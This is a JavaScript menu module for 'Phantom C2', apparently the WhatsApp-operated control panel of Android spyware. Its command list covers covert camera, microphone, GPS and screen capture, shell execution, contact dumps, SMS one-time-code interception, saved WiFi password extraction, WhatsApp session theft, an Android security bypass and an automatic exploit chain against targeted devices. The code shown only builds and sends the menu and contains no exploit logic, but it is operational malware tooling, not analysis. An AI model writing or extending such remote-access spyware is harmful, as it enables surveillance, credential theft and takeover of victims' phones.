const BEAUTIFUL_MENU = `╭━━━━━━━━━━━━━━━━━━━━╮
┃   *PHANTOM C2* — 6-Proof  ┃
╰━━━━━━━━━━━━━━━━━━━━╯

📢 *Broadcast Mode* | 📶 WhatsApp

━━━━━━━━━━━━━━━━━━━━━

*📱 DEVICE CONTROL*
┠ ⌯ !screenshot  — Capture screen
┠ ⌯ !gps         — Device location
┠ ⌯ !camera      — Take photo
┠ ⌯ !mic         — Record audio

*💻 SHELL & COMMANDS*
┠ ⌯ !shell <cmd> — Execute command
┠ ⌯ !clipboard   — Read clipboard
┠ ⌯ !notification — Push alert

*🔍 INFORMATION*
┠ ⌯ !ip          — Network info
┠ ⌯ !sysinfo     — System info
┠ ⌯ !installed   — Installed apps
┠ ⌯ !contacts    — Dump contacts
┠ ⌯ !wifi        — WiFi info

*📁 FILES & MEDIA*
┠ ⌯ !dir <path>  — List directory
┠ ⌯ !download    — Get file
┠ ⌯ !upload      — Put file

*💉 EXPLOITS*
┠ ⌯ !auto_pwn    — Auto exploit chain
┠ ⌯ !exploit     — List exploits

*🔐 SECURITY*
┠ ⌯ !encrypt     — Encrypt text
┠ ⌯ !decrypt     — Decrypt response
┠ ⌯ !c2 <cmd>    — Stealth command

*⚙️ MANAGEMENT*
┠ ⌯ !devices     — List devices
┠ ⌯ !target <id> — Set target
┠ ⌯ !untarget    — Broadcast mode
┠ ⌯ !status      — Bot health

━━━━━━━━━━━━━━━━━━━━━
_Send any command with ! prefix_`;

export default {
  name: 'menu',
  commands: ['menu', 'help', 'start'],
  handler: async (ctx) => {
    const { sock, jid, groupJid, getDevices, getTarget, sendInteractiveList } = ctx;
    const devices = getDevices();
    const target = getTarget(jid);
    const targetDevice = target ? devices.find(d => d.device_id === target) : null;
    const status = targetDevice ? (targetDevice.is_online ? '🟢' : '🔴') : '📢';

    const header = target
      ? `🎯 *${target}* ${status}`
      : `📢 *Broadcast Mode*`;

    const uiJid = (groupJid && !ctx.isGroup) ? groupJid : jid;
    const isRouting = uiJid !== jid;

    const sections = [
      {
        title: '📱 DEVICE CONTROL',
        rows: [
          { title: '📸 Screenshot', description: 'Capture device screen', rowId: 'screenshot' },
          { title: '📍 GPS', description: 'Get device location', rowId: 'gps' },
          { title: '📷 Camera', description: 'Take photo (front/back)', rowId: 'camera' },
          { title: '🎙️ Microphone', description: 'Record audio', rowId: 'mic' },
        ]
      },
      {
        title: '💻 SHELL & COMMANDS',
        rows: [
          { title: '💻 Shell', description: 'Execute shell command', rowId: 'shell' },
          { title: '📋 Clipboard', description: 'Read clipboard', rowId: 'clipboard' },
          { title: '🔔 Notification', description: 'Push notification', rowId: 'notification' },
        ]
      },
      {
        title: '🔍 INFORMATION',
        rows: [
          { title: '🌐 IP Info', description: 'Device network info', rowId: 'ip' },
          { title: '⚙️ Sysinfo', description: 'Full system info', rowId: 'sysinfo' },
          { title: '📱 Installed Apps', description: 'List installed apps', rowId: 'installed' },
          { title: '📇 Contacts', description: 'Dump contacts', rowId: 'contacts' },
          { title: '📡 WiFi', description: 'WiFi networks', rowId: 'wifi' },
        ]
      },
      {
        title: '💉 EXPLOITS',
        rows: [
          { title: '🤖 AutoPwn', description: 'Auto exploit chain', rowId: 'auto_pwn' },
          { title: '🛡️ SDP Bypass', description: 'Android 15 SDP bypass', rowId: 'sdp_bypass' },
          { title: '🔑 OTP Grabber', description: 'SMS code interception', rowId: 'otp_grabber' },
          { title: '📡 WiFi Passwords', description: 'Extract saved passwords', rowId: 'wifi_extractor' },
          { title: '🔓 Session Stealer', description: 'Steal WA sessions', rowId: 'session_stealer' },
        ]
      },
      {
        title: '⚙️ MANAGEMENT',
        rows: [
          { title: '📱 Devices', description: 'List all devices', rowId: 'devices' },
          { title: '🎯 Set Target', description: 'Lock onto a device', rowId: 'target' },
          { title: '📢 Untarget', description: 'Broadcast mode', rowId: 'untarget' },
          { title: '📊 Status', description: 'Bot health', rowId: 'status' },
        ]
      }
    ];

    try {
      await sendInteractiveList(sock, uiJid, {
        text: `${header}\n📶 WhatsApp`,
        footer: 'Phantom C2 — 6-Proof Framework',
        title: '☰ COMMAND CENTER',
        buttonText: '📋 MENU',
        sections
      });
      if (isRouting) {
        await sock.sendMessage(jid, { text: '📋 *Interactive menu* sent to the Phantom C2 Ops group ✅' });
      }
    } catch (e) {
      console.error('[menu] interactive list failed:', e.message);
      await sock.sendMessage(jid, { text: BEAUTIFUL_MENU });
    }
  }
};
